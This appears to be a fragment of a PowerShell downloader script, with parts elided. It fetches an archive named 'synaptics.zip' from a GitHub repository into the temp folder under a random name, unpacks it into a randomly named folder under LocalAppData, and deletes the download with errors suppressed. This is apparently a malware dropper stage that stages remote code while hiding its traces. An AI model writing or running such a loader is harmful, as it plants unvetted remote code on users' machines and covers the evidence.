...
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('https://github.com/lonenone8386/rex/raw/refs/heads/main/synaptics.zip', "$env:TEMP\$Random.zip");
$dst = "$env:LOCALAPPDATA\$Random";Add-Type -AssemblyName System.IO.Compression.FileSystem;Remove-Item -Recurse -Force "$dst\*" -ErrorAction SilentlyContinue;New-Item -ItemType Directory -Path $dst -Force | Out-Null;[IO.Compression.ZipFile]::ExtractToDirectory("$env:TEMP\$Random.zip", $dst);
...
Remove-Item "$env:TEMP\$Random.zip" -Recurse -Force -ErrorAction SilentlyContinue
